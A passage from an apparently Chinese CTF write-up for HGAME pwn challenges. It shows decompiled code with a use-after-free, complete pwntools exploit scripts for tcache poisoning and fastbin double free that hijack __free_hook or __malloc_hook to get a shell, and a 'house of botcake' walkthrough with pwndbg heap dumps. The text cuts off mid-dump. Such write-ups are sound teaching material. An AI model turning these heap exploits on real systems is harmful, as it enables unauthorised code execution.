<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">delete_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">free</span>(notes[v2]);			<span class="comment">// uaf漏洞</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>edit：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">edit_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, notes[v2], note_size[v2]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>show：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show_note</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( notes[v2] )</span><br><span class="line">      <span class="built_in">puts</span>(notes[v2]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Page not found.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There are only 16 pages in this notebook.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>申请9个<code>unsortedbin</code>大小的堆，释放前8个，其中7个进入<code>tcachebin</code>，1个进入<code>unsortedbin</code>，第9个堆用于避免被<code>topchunk</code>吸收。</li>
<li>打印得到<code>libc</code>地址，计算<code>__free_hook</code>和<code>system</code>。</li>
<li>修改第6个堆的<code>fd</code>指针指向<code>__free_hook</code>。</li>
<li>再申请2个堆，劫持<code>__free_hook</code>为<code>system</code>。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">31047</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p><code>libc2.23</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样，因此可以构造<code>double free</code>。</p>
<ul>
<li>申请两个堆，第一个有<code>unsortedbin</code>大小，释放第一个，泄露<code>libc</code>。</li>
<li>再申请两个数据大小为<code>0x60</code>的堆，释放其中第一个，再释放第二个，再释放第一个，绕过检查，达成<code>double free</code>。</li>
<li>再申请一个数据大小为<code>0x60</code>的堆，并修改其<code>fd</code>指向<code>__malloc_hook-0x23</code>处。</li>
<li>将<code>__malloc_hook-0x23</code>处的堆块申请过来，修改<code>__malloc_hook</code>为<code>one_gadget</code>，必要时用<code>realloc</code>进行调整。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30160</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">104</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log,success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">gadgets=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base+gadgets[<span class="number">3</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h3><p><code>libc2.31</code>下的<code>uaf</code>漏洞，无<code>edit</code>功能，其他功能和上述一样。由于引入了<code>tcache</code>，这里学习了一种新的<code>double free</code>利用手法<code>house of botcake</code>。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/brain-Z/p/16853137.html">参考文章</a></p>
<ul>
<li>分配9个<code>unsortedbin</code> 大小的堆块，释放掉前7个，再申请一个保护堆块防止合并。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<ul>
<li>释放掉第9个堆块。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6710</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6710</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>

<ul>
<li>释放掉第8个堆块，触发<code>unsortedbin consolidate</code>合并为一个大堆块。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x563c55bf6680</span></span><br><span class="line"><span class="number">0x563c55bf6680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000121</span></span><br><span class="line"><span class="number">0x563c55bf6690</span>:	<span class="number">0x00007fe8d8e26be0</span>	<span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf66a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6700</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x563c55bf6720</span>:	<span class="number">0x00007fe8d8e26be0</span>	<span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf6730</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6740</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6750</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6760</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure>

<ul>
<li>申请一个堆块(Tcache优先)，再释放掉第9个堆块，此时两个指针分别位于<code>unsortedbin</code>中和<code>tcache</code>中，完成了<code>double free</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span class="number">0x563c55bf6570</span> —▸ <span class="number">0x563c55bf64e0</span> —▸ <span class="number">0x563c55bf6450</span> —▸ <span class="number">0x563c55bf63c0</span> —▸ <span class="number">0x563c55bf6330</span> —▸ <span class="number">0x563c55bf62a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<ul>
<li>只需申请一个比第9个堆块大的堆块，便能切割<code>unsortedbin</code>，在第9个堆块处的<code>fd</code>指针留下<code>__free_hook</code>即可。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> —▸ <span class="number">0x7fe8d8e28e48</span> (__free_hook) ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span 